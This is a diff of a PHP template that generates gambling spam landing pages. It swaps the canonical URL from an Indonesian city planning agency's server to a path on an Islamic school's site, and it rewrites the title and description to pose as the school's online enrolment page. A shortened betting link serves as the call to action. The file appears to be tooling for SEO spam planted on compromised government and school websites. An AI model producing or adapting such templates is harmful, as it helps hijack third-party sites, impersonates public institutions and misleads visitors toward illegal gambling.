@@ -33,14 +33,14 @@ if (!$found) {
     show404();
 }
 $amphtml = "https://tamuramah.com/id/$dashbrand";
-$canonical = "https://bappeda.kedirikota.go.id/emonev/storage/$dashbrand";
+$canonical = "https://cbt.almujahidinjoglo.or.id/temp/$dashbrand";
 $cta = "https://t.ly/betserulink";
-$gambar = "https://res.cloudinary.com/dyyaa4aug/image/upload/v1732196684/OIG4.VMYSz_z7.dyAU_YRkHGs_uumn1p.jpg";
+$gambar = "https://res.cloudinary.com/dyyaa4aug/image/upload/v1732029618/OIG1..Y4mTjBBGaMLp7EyRAQd_xszlta.jpg";
 $price = "5000.00";
 
-$judul = "$namabrand Koordinator Bappeda Kota Kediri";
-$desc = "$namabrand mewujudkan pembangunan berkualitas untuk perencanaan Bappeda di kota Kediri yang handal melalui berbagai startegi serta inovasi yang selalu mengutamakan transparansi dan juga pemerintah yang bersih dari segala bentuk tindakan yang menyimpang.";
-$konten = "$namabrand mewujudkan pembangunan berkualitas untuk perencanaan Bappeda di kota Kediri yang handal melalui berbagai startegi serta inovasi yang selalu mengutamakan transparansi dan juga pemerintah yang bersih dari segala bentuk tindakan yang menyimpang.";
+$judul = "$namabrand PPDB Online Yaspendis Al-Mujahidin";
+$desc = "$namabrand merupakan yayasan pendidikan Islam Yaspendis Al-Mujahidin untuk bisa mendaftarkan siswa dan siswi agar bisa belajar di sekolah ini dengan mudah ditambah ada fasilitas yang bagus untuk mereka bisa belajar dengan baik sesuai dengan kurikulum yang diajarkan.";
+$konten = "$namabrand merupakan yayasan pendidikan Islam Yaspendis Al-Mujahidin untuk bisa mendaftarkan siswa dan siswi agar bisa belajar di sekolah ini dengan mudah ditambah ada fasilitas yang bagus untuk mereka bisa belajar dengan baik sesuai dengan kurikulum yang diajarkan.";
 ?>
 
 <!DOCTYPE HTML>
